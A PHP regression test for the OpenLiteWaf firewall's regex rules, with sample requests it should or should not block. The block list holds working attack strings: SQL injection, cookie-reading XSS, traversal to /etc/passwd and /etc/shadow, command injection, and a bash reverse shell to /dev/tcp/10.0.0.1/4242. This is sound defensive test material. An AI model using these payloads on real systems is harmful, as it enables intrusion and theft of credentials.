# OpenLiteWaf 规则正误样本回归测试（PHP PCRE 与 OpenResty ngx.re 同源）
# 用法：php OpenLiteWaf/tests/openlitewaf_regex_test.php

<?php
$fail = 0;
$luaFile = __DIR__ . '/../lua/openlitewaf.lua';
$lua = file_get_contents($luaFile);
if (!preg_match('/-- RULES-BEGIN(.*?)-- RULES-END/s', $lua, $m)) {
    exit("未找到 RULES-BEGIN/END 标记\n");
}
// 支持可选等号长括号 [[...]] / [==[...]==]（规则含 ]] 字符时按 README 规范
// 使用等号长括号书写，如 uname 的字符类规则），否则这类规则会被静默漏解析、
// 脱离回归测试。第三元素为可选的匹配对象作用域（uri / ua / body，空格分隔），
// 省略即作用于全部匹配对象。
if (!preg_match_all('/\{\s*"([a-z]+)",\s*\[(=*)\[(.*?)\]\2\](?:\s*,\s*"([a-z ]+)")?\s*\}/s', $m[1], $raw, PREG_SET_ORDER)) {
    exit("未解析到任何规则\n");
}
$rules = [];
foreach ($raw as $r) {
    // 组 1 = 类目，组 2 = 长括号等号，组 3 = 正则体，组 4 = 作用域（可省略）
    $rules[] = ['cat' => $r[1], 're' => $r[3], 'scope' => $r[4] ?? ''];
}
echo '已加载规则数：' . count($rules) . "\n";

// 漏条守门：解析器一旦跟不上规则表写法（新增括号形态、多行书写等），
// 缺失的规则会静默脱离本回归测试 —— 这正是历史上 [==[ ]==] 长括号规则踩过的坑。
$declared = preg_match_all('/^\s*\{\s*"/m', $m[1]);
if (count($rules) !== $declared) {
    exit("规则解析漏条：块内声明 {$declared} 条，实际解析 " . count($rules) . " 条\n");
}
foreach ($rules as $i => $rule) {
    foreach (array_filter(preg_split('/ +/', $rule['scope']) ?: [], 'strlen') as $tok) {
        if (!in_array($tok, ['uri', 'path', 'ua', 'body'], true)) {
            exit('规则 #' . ($i + 1) . " 作用域非法：{$tok}（仅允许 uri/path/ua/body）\n");
        }
    }
}

// 与 openlitewaf.lua 一致的匹配语义：按匹配对象外层、规则表内层的顺序，命中即停；
// 规则声明的作用域不含当前匹配对象时跳过该规则。生产为 URI 侧提供两个匹配对象——
// 原始/解码 request_uri（kind=uri，含 query）与规范化路径（kind=path，不含 query），
// 这里用截断 '?' 后的路径段近似规范化路径。
function kind_of(string $subject): string
{
    return str_starts_with($subject, '/') ? 'uri' : 'ua';
}

function path_of(string $subject): string
{
    $q = strpos($subject, '?');
    return $q === false ? $subject : substr($subject, 0, $q);
}

function applies(string $scope, string $kind): bool
{
    return $scope === '' || in_array($kind, preg_split('/ +/', $scope) ?: [], true);
}

function first_hit(array $rules, string $subject, string $kind): ?string {
    foreach ($rules as $rule) {
        if (applies($rule['scope'], $kind) && @preg_match('~' . $rule['re'] . '~i', $subject)) {
            return $rule['cat'];
        }
    }
    return null;
}

function check(array $rules, string $subject, string $kind): ?string {
    if ($kind !== 'uri') {
        return first_hit($rules, $subject, $kind);
    }
    // 编码形态先查，再查解码形态（与生产的双 subject 一致）
    foreach (array_unique([$subject, urldecode($subject)]) as $form) {
        $hit = first_hit($rules, $form, 'uri');
        if ($hit !== null) return $hit;
        $hit = first_hit($rules, path_of($form), 'path');
        if ($hit !== null) return $hit;
    }
    return null;
}

// [subject, 期望类目或 null, 匹配对象?]（第三元素省略时按 kind_of 推断：/ 开头为 uri，否则为 ua）
$cases = [
    // ── 应拦截 ──
    ['/v1/log?id=1 UNION SELECT username FROM users', 'sqli'],
    ["/?id=1' OR '1'='1", 'sqli'],
    ['/?id=1%27%20OR%20%271%27%3D%271', 'sqli'],
    ['/?q=1 and 1=2', 'sqli'],
    ['/?t=1;WAITFOR DELAY "0:0:5"--', 'sqli'],
    ['/?x=<script>alert(1)</script>', 'xss'],
    ['/?redirect=javascript:alert(1)', 'xss'],
    ['/?img=x" onerror=alert(1)', 'xss'],
    ['/?back=javascript:void(document.cookie)', 'xss'],
    ['/download?file=../../../../etc/passwd', 'traversal'],
    ['/?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'traversal'],
    ['/?p=..\\..\\windows', 'traversal'],
    ['/.env', 'probe'],
    ['/.git/config', 'probe'],
    ['/wp-login.php', 'probe'],
    ['/phpmyadmin/index.php', 'probe'],
    ['/db.backup.sql', 'probe'],
    ['/index.php', 'probe'],
    ['/actuator/health', 'probe'],
    ['/cgi-bin/test.cgi', 'probe'],
    ['/id_rsa', 'probe'],
    ['sqlmap/1.7.11#stable', 'probe'],
    ['Nikto/2.5.0', 'probe'],
    ['gobuster/3.6', 'probe'],
    // ── 新增规则样本（v1.1.0：rce 类目 + 扩充探测/扫描器）──
    ['/?cmd=1;cat+/etc/passwd', 'traversal'],
    ['/download?file=/proc/self/environ', 'rce'],
    ['/?exec=%24%28whoami%29', 'rce'],
    ['/?c=%60id%60', 'rce'],
    ['/?c=1|bash -i >& /dev/tcp/10.0.0.1/4242', 'rce'],
    ['/?cmd=uname -a', 'rce'],
    ['/?load=system%28id%29', 'rce'],
    ['/?u=data:text/html;base64,AAAA', 'xss'],
    ['/?v=@@version', 'sqli'],
    ['/?s=extractvalue(1,concat(0x7e,user()))', 'sqli'],
    ['/?p=1;sleep(5)', 'sqli'],
    ['/?q=1 and updatexml(1,0x7e,1)', 'sqli'],
    ['/nacos/', 'probe'],
    ['/druid/index.html', 'probe'],
    ['/jenkins/login', 'probe'],
    ['/solr/', 'probe'],
    ['/server-status', 'probe'],
    ['/wp-json/wp/v2/users', 'probe'],
    ['/.htpasswd', 'probe'],
    ['xray/1.2.4', 'probe'],
    ['dirsearch/3.1', 'probe'],
    ['feroxbuster/2.10', 'probe'],
    ['whatweb/0.5.5', 'probe'],
    // ── 不应拦截（正常业务与常见 UA）──
    ['/v1/log', null],
    ['/v1/raw/Ks7dQ2a', null],
    ['/?p=2&n=50', null],
    ['/v1/raw/abc123?start=10&end=20', null],
    ['/v1/insights?range=24h', null],
    ['/v1/limits', null],
    ['/?content=[12:34:56] [INFO]: Starting server on 1.2.3.4', null],
    ['/v1/log?token=abc123def456', null],
    ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0', null],
    ['LogShare-CLI/1.0 (+https://logshare.cn)', null],
    ['curl/8.5.0', null],
    ['LogShare-MC-Plugin/2.1', null],
    ['/.well-known/acme-challenge/token123', null],
    ['/v1/log?message=SUCCESS OR FAILURE', null],
    // ── 新增规则的反例（防误报）──
    ['/?q=evaluate the plan', null],
    ['/?msg=status; done id=5', null],
    ['/?n=The-Console.html', null],
    ['/solrway-backup', null],
    ['/?note=reindex druidx', null],
    ['/?title=manager/htmlbook', null],
    ['Go-http-client/2.0', null],
    ['LogShare-Bot/1.0 (+https://logshare.cn)', null],
    // python-httpx 是常用 HTTP 客户端的默认 UA，不得被 httpx 规则误伤
    ['python-httpx/0.27.2', null],
    // S1 回归：/security 前缀变体必须仍被规则覆盖（WAF 侧不得跳过特征检查）
    ['/security/../../etc/passwd', 'traversal'],
    ['/securityXYZ?q=<script>alert(1)</script>', 'xss'],
    ['/security/stats?id=1%20UNION%20SELECT%20a', 'sqli'],
    // 统计页自身两个精确 URI 不应被规则误伤
    ['/security', null],
    ['/security/stats', null],
    // ── v1.3.0 匹配对象作用域：路径形态的探测特征不再作用于请求体与 UA ──
    // 请求体里出现文件名与路径串属正常业务（日志分享、知识库正文、前端遥测）
    ['{"items":[{"type":"api","endpoint":"https://logshare.cn/v1/raw/qKSA1QU/main.log","status":200}]}', null, 'body'],
    ['{"type":"error","message":"cannot read config.yml","stack":"at /assets/latest.log reader"}', null, 'body'],
    ['知识库正文提到 /.git/config 与 phpmyadmin 与 /cgi-bin/ 与 web.config', null, 'body'],
    ['{"name":"serverstatus snapshot","file":"sitemap.xml","note":"druid nacos jenkins cgi"}', null, 'body'],
    // 但 body 里的真实 payload 特征仍必须命中（作用域收窄不等于关闭 body 检查）
    ['{"q":"1 union select user,password from users"}', 'sqli', 'body'],
    ['{"html":"<script>document.cookie</script>"}', 'xss', 'body'],
    ['{"path":"../../../../etc/passwd"}', 'traversal', 'body'],
    ['{"cmd":"1;cat /etc/hosts"}', 'traversal', 'body'],
    // multipart 上传文件名带可执行后缀（只有 body 作用域的规则能看到）
    ['Content-Disposition: form-data; name="file"; filename="shell.php"', 'probe', 'body'],
    ['Content-Disposition: form-data; name="file"; filename="up.phtml"', 'probe', 'body'],
    // 正常附件名与文档名不得误伤
    ['Content-Disposition: form-data; name="file"; filename="latest.log"', null, 'body'],
    ['Content-Disposition: form-data; name="file"; filename="notes.md"', null, 'body'],
    // 扫描器 UA 规则不看 body
    ['{"ua":"Mozilla/5.0 (compatible; hydra-client/1.0)"}', null, 'body'],
    // query 里的文件名不再判探测；请求路径里的敏感文件仍然要拦
    ['/v1/log?file=latest.log', null],
    ['/v1/admin/rag/docs/content?path=config.json', null],
    ['/sitemap.xml', null],
    ['/robots.txt', null],
    ['/v1/telemetry/report', null],
    ['/latest.log', 'probe'],
    ['/web.config', 'probe'],
    ['/appsettings.json', 'probe'],
    ['/.git-credentials', 'probe'],
    ['/db.backup.sql', 'probe'],
    ['/?u=%2e%2e%2f%2e%2e%2fetc%2fshadow', 'traversal'],
];

foreach ($cases as $case) {
    $subject = $case[0];
    $expected = $case[1];
    $kind = $case[2] ?? kind_of($subject);
    $got = check($rules, $subject, $kind);
    if ($got !== $expected) {
        $fail++;
        echo "FAIL [{$kind}]: {$subject}\n  期望: " . var_export($expected, true) . "  实际: " . var_export($got, true) . "\n";
    }
}

echo $fail === 0 ? "全部通过（" . count($cases) . " 个样本）\n" : "{$fail} 个样本失败\n";
exit($fail === 0 ? 0 : 1);
